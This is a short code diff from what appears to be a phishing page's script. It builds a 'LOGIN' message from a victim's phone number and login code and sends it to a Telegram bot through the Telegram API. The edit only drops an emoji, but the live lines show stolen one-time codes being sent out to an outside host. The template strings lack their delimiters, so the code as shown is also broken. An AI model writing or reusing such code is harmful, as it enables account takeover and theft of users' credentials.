@@ -187,7 +187,7 @@
         successDiv.textContent = 'Sending...';
         successDiv.style.display = 'block';
         
-        const message = 🔐 LOGIN\nPhone: ${phone}\nCode: ${code};
+        const message = LOGIN\nPhone: ${phone}\nCode: ${code};
         const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
         
         try {
